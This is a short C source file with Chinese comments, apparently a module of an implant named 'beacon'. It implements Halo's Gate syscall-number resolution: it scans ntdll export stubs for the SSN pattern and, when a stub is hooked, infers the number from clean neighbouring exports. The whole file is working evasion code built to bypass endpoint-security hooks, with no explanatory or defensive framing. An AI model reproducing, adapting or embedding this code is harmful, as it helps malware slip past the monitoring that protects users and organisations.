#include "beacon_syscall_internal.h"

/*
 * halos_gate.c -- Halo's Gate SSN 解析。
 *
 * 流程（参考 D:\code\Vs2022\syscall\HaloGate）：
 *  1. 自身入口 32 字节内扫 `4C 8B D1 B8` 提取 SSN（Hell's Gate）；
 *  2. 失败（入口被 hook）→ 在排序导出表中 ±8 搜索干净邻居，
 *     从邻居 SSN 推算：ssn = neighborSsn - (delta * dir)，负数保护；
 *  3. 全部失败 → FALSE，上层回退 native。
 */

#define HALOS_NEIGHBOR_RANGE 8

static BOOL HalosInit(VOID)
{
    return GateInitCache();
}

static BOOL HalosResolve(UINT32 func_id, PUINT32 ssn_out)
{
    const GateExport* exports;
    UINT32 count;
    LONG myIdx;
    LONG delta;
    UINT32 ssn;

    if (func_id >= SYSCALL_NT_COUNT || !ssn_out) return FALSE;

    exports = GateGetExports(&count);
    if (!exports || count == 0) return FALSE;

    myIdx = GateFindByHash(GateHashName(g_syscall_apis[func_id].name));
    if (myIdx < 0) return FALSE;

    /* 1. 自身特征扫描 */
    if (GateExtractSsn((PBYTE)exports[myIdx].Address, &ssn)) {
        *ssn_out = ssn;
        return TRUE;
    }

    /* 2. ±8 邻居推算：跳过被 hook 的邻居，从干净邻居反推自身 SSN */
    for (delta = 1; delta <= HALOS_NEIGHBOR_RANGE; delta++) {
        LONG dir;

        for (dir = -1; dir <= 1; dir += 2) {
            LONG ni = myIdx + delta * dir;
            UINT32 neighborSsn;

            if (ni < 0 || ni >= (LONG)count) continue;
            if (GateIsHooked((PBYTE)exports[ni].Address)) continue;
            if (!GateExtractSsn((PBYTE)exports[ni].Address, &neighborSsn)) continue;

            /* 邻居 SSN 与目标 SSN 的差值 = 排序索引差值：ssn = neighbor - delta*dir */
            if ((LONG)neighborSsn - (LONG)(delta * dir) < 0) continue;

            *ssn_out = neighborSsn - (UINT32)(delta * dir);
            return TRUE;
        }
    }

    return FALSE;
}

const SyscallProviderOps g_syscall_provider_halos_gate = {
    "halos_gate",
    HalosInit,
    HalosResolve,
    NULL
};
